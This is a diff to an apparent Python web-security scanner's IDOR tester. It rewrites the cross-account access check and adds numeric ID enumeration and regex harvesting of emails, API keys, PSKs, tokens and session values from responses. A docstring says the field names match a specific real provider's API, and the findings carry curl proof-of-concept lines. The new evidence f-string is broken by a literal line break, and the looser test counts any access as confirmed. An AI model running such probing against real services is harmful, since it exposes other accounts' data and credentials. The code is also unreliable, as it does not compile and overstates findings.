@@ -318,58 +318,74 @@ class AuthenticatedTester:
         return s
 
     def _test_idor(self, s1: requests.Session, s2: requests.Session):
-        """IDOR: User A's data accessible by User B."""
+        """IDOR: User A's resources accessible by User B.
+        
+        Key insight: access to another org's endpoint IS the vulnerability.
+        We don't need PII in the response — unauthorized access = IDOR.
+        """
         print("  [IDOR] Testing access control...")
-        endpoints = self.map.get("data_endpoints", []) + self.map.get("id_params", [])
+        endpoints = list(set(
+            self.map.get("data_endpoints", []) +
+            self.map.get("id_params", []) +
+            self.map.get("endpoints", [])
+        ))
 
-        for ep in endpoints[:20]:
+        org_id  = self.map.get("org_id", "")
+        user_id = self.map.get("user_id", "")
+
+        for ep in endpoints[:30]:
             try:
+                # Session 1: verify endpoint returns real data
                 r1 = s1.get(ep, timeout=10)
-                if r1.status_code != 200 or len(r1.text) < 50:
+                if r1.status_code != 200:
+                    continue
+                if len(r1.text) < 10:
                     continue
 
-                # Check for sensitive data in response
                 sensitive = self._extract_sensitive(r1.text)
-                if not sensitive:
-                    continue
+                print(f"  [IDOR] {r1.status_code} {urlparse(ep).path[:50]} {'| '+str(sensitive)[:60] if sensitive else ''}")
 
-                # If we have second session, try cross-account access
+                # Session 2 cross-account test
                 if s2:
                     r2 = s2.get(ep, timeout=10)
-                    if r2.status_code == 200:
+                    if r2.status_code == 200 and len(r2.text) > 10:
+                        # Check if s2 gets DIFFERENT data (different account)
                         s2_sensitive = self._extract_sensitive(r2.text)
-                        if s2_sensitive:
-                            # Both accounts can see the same data
+                        # Access to org endpoint by another account = IDOR
+                        if org_id and org_id in ep:
                             self._add_finding(
-                                title    = f"IDOR — Cross-Account Data Access: {urlparse(ep).path}",
-                                severity = "CRITICAL",
+                                title    = f"IDOR — Org Resource Accessible by Other Account: {urlparse(ep).path}",
+                                severity = "CRITICAL" if sensitive else "HIGH",
                                 url      = ep,
-                                evidence = f"Account 1 sees: {sensitive}\nAccount 2 sees: {s2_sensitive}",
-                                poc      = f'curl -sk "{ep}" -H "Cookie: ACCOUNT_B_SESSION"',
-                                impact   = "Any authenticated user can access other users data",
+                                evidence = (f"Account 1 response ({len(r1.text)}b): {r1.text[:300]}
+
+"
+                                           f"Account 2 can also access ({len(r2.text)}b): {r2.text[:300]}"),
+                                poc      = f'curl -sk "{ep}" -H "Cookie: SECOND_ACCOUNT_SESSION"',
+                                impact   = "Account 2 can access Account 1's org data without authorization",
                             )
                             print(f"  [!!!] IDOR CONFIRMED: {ep}")
-                            continue
 
-                # Single account: enumerate IDs
-                id_match = re.search(r'/(\d{4,})', ep)
-                if id_match:
-                    orig_id = id_match.group(1)
-                    for delta in [-1, +1, -2, +2]:
-                        test_id  = str(int(orig_id) + delta)
-                        test_url = ep.replace(f"/{orig_id}", f"/{test_id}", 1)
-                        r_test   = s1.get(test_url, timeout=10)
-                        if r_test.status_code == 200:
-                            test_sensitive = self._extract_sensitive(r_test.text)
-                            if test_sensitive:
-                                self._add_finding(
-                                    title    = f"IDOR — Sequential ID Enumeration: {urlparse(ep).path}",
-                                    severity = "HIGH",
-                                    url      = test_url,
-                                    evidence = f"ID {test_id} returns: {test_sensitive}",
-                                    poc      = f'curl -sk "{test_url}" -H "Cookie: YOUR_SESSION"',
-                                    impact   = "Enumerate all user records by incrementing ID",
-                                )
+                # Single-account: try adjacent org UUIDs if numeric ID in URL
+                if org_id and not s2:
+                    id_match = re.search(r'/(\d{6,})', ep)
+                    if id_match:
+                        orig_id = id_match.group(1)
+                        for delta in [-1, +1]:
+                            test_id  = str(int(orig_id) + delta)
+                            test_url = ep.replace(orig_id, test_id, 1)
+                            r_test   = s1.get(test_url, timeout=8)
+                            if r_test.status_code == 200 and len(r_test.text) > 20:
+                                ts = self._extract_sensitive(r_test.text)
+                                if ts:
+                                    self._add_finding(
+                                        title    = f"IDOR — Numeric ID Enumeration: {urlparse(ep).path}",
+                                        severity = "HIGH",
+                                        url      = test_url,
+                                        evidence = f"Adjacent ID {test_id} returns data: {ts}",
+                                        poc      = f'curl -sk "{test_url}" -H "Cookie: YOUR_SESSION"',
+                                        impact   = "Sequential ID allows enumerating other accounts",
+                                    )
 
             except Exception:
                 pass
@@ -518,20 +534,25 @@ class AuthenticatedTester:
                 pass
 
     def _extract_sensitive(self, text: str) -> list:
-        """Extract real sensitive fields from response."""
+        """Extract real sensitive fields from response.
+        Matches Anthropic API field names confirmed from debug_session.py.
+        """
         found  = []
         fields = {
-            "email":   r'"email"\s*:\s*"([^"@]+@[^"]+)"',
-            "phone":   r'"phone"\s*:\s*"([+\d\s-]{7,})"',
-            "name":    r'"(?:full_name|display_name|name)"\s*:\s*"([^"]{3,50})"',
-            "user_id": r'"(?:uuid|user_id|id)"\s*:\s*"([a-f0-9-]{20,})"',
-            "api_key": r'"(?:key|api_key|secret)"\s*:\s*"([^"]{20,})"',
-            "token":   r'"(?:token|access_token)"\s*:\s*"([^"]{20,})"',
+            "email":    r'"(?:email|email_address)"\s*:\s*"([^"@]+@[^"]+)"',
+            "name":     r'"(?:full_name|display_name|name)"\s*:\s*"([^"]{2,60})"',
+            "uuid":     r'"(?:uuid|user_id|tagged_id)"\s*:\s*"([a-z0-9_\-]{15,})"',
+            "api_key":  r'"(?:key|api_key|secret|psk)"\s*:\s*"([^"]{20,})"',
+            "token":    r'"(?:token|access_token|session)"\s*:\s*"([^"]{20,})"',
+            "org_name": r'"(?:organization_name|org_name|name)"\s*:\s*"([^"]{3,80})"',
+            "phone":    r'"(?:phone|phone_number)"\s*:\s*"([+\d\s\-]{7,})"',
         }
         for field, pattern in fields.items():
             m = re.search(pattern, text, re.I)
             if m:
-                found.append(f"{field}={m.group(1)[:30]}")
+                val = m.group(1)[:40]
+                if val not in ['null', 'true', 'false', '']:
+                    found.append(f"{field}={val}")
         return found
 
     def _add_finding(self, title: str, severity: str, url: str,
